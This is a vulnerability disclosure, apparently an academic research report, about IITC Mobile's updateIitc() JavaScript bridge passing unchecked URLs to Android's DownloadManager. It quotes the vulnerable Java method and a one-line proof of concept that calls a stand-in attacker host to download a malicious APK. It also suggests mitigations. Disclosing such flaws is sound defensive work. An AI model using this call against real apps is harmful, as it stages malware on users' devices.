# Arbitrary APK Download via `updateIitc()` JavaScript Bridge

## Detection note

This issue was identified through automated LLM-based static analysis of WebView `addJavascriptInterface` bridges, as part of academic security research at the University of Southern Denmark (SDU) in the context of a masters level course named Engineering in Research.

The finding was manually reviewed before submission.

To aid the purposes of our research, we would kindly request acknowledgement of the reported issue as well as a final verdict from the open source community working on this repository, even if the issue is not acted on.

We are reporting in good faith and are happy to answer questions.

## Summary

The `updateIitc(String fileUrl)` method in `IITC_JSInterface.java` passes the caller-controlled URL directly to Android's `DownloadManager` with no validation, scheme restriction, or integrity check. Any JavaScript running inside the WebView can silently trigger a background download of an arbitrary file (including APKs) from any URL. While Android requires user interaction to install APKs, the invisible download primes the device for a social engineering attack ("tap here to complete the update").

**Severity:** Medium
**Affected version(s):** latest commit on the default branch (commit hash unknown at time of analysis)

---

## Affected file(s)

- `mobile/src/com/cradle/iitc_mobile/IITC_JSInterface.java` — `updateIitc(String)`
- `mobile/src/com/cradle/iitc_mobile/IITC_Mobile.java` — `updateIitc(String url)`

---

## Vulnerable code

```java
public void updateIitc(final String url) {
    final DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
    request.setTitle("IITCm Update");
    final Uri fileUri = Uri.parse("file://" + getExternalFilesDir(null).toString() + "/iitcUpdate.apk");
    request.setDestinationUri(fileUri);
    deleteUpdateFile();
    final DownloadManager manager = (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);
    manager.enqueue(request);
}
```

---

## Proof of concept

```js
// Any JS running inside the IITC WebView can call:
android.updateIitc("http://attacker.com/malware.apk");
```

The download runs silently in the background, stored as `iitcUpdate.apk` in the app's external files directory. No user notification is shown before the download begins.

---

## Impact

Any JavaScript executing in the WebView — for example, via a malicious IITC plugin or via MITM injection of an HTTP-fetched script update — can silently download an arbitrary APK to the device. The user receives no warning during the download. If the user is subsequently prompted to install the staged APK (social engineering), the device may be compromised. No URL allowlist, HTTPS enforcement, or file integrity check is present.

---

## Suggested mitigation

1. Validate `fileUrl` against an HTTPS-only allowlist of trusted update servers before enqueuing the download.
2. After download completes, verify the file's integrity using a cryptographic signature or checksum before displaying any install prompt.
3. Consider removing the JS-callable update path entirely and routing updates through the Play Store or an in-app update flow that is not reachable from arbitrary JavaScript.
